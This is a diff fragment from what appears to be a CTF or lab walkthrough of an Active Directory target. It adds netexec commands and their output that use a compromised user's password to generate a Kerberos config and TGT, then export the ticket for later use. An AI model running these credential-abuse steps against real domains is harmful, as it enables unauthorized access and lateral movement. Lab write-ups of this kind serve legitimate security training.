@@ -367,5 +367,20 @@ This user is now compromised!
 Then ill generate a TGT and krb5.conf file and export them both
 
 ```python
+sudo nxc smb $target -u 'jason.caldwell' -p 'Password123' -k --generate-krb5-file /etc/krb5.conf
+[sudo] password for kali: 
+SMB         dc.hsm-defense.local 445    dc               [*]  x64 (name:dc) (domain:hsm-defense.local) (signing:True) (SMBv1:None) (NTLM:False)
+SMB         dc.hsm-defense.local 445    dc               [+] krb5 conf saved to: /etc/krb5.conf
+SMB         dc.hsm-defense.local 445    dc               [+] Run the following command to use the conf file: export KRB5_CONFIG=/etc/krb5.conf
+SMB         dc.hsm-defense.local 445    dc               [+] hsm-defense.local\jason.caldwell:Password123
 
+sudo nxc smb $target -u 'jason.caldwell' -p 'Password123' -k --generate-tgt jason.caldwell      
+SMB         dc.hsm-defense.local 445    dc               [*]  x64 (name:dc) (domain:hsm-defense.local) (signing:True) (SMBv1:None) (NTLM:False)
+SMB         dc.hsm-defense.local 445    dc               [+] hsm-defense.local\jason.caldwell:Password123 
+SMB         dc.hsm-defense.local 445    dc               [+] TGT saved to: jason.caldwell.ccache
+SMB         dc.hsm-defense.local 445    dc               [+] Run the following command to use the TGT: export KRB5CCNAME=jason.caldwell.ccache
+
+export KRB5_CONFIG=/etc/krb5.conf
+
+export KRB5CCNAME=jason.caldwell.ccache
 ```
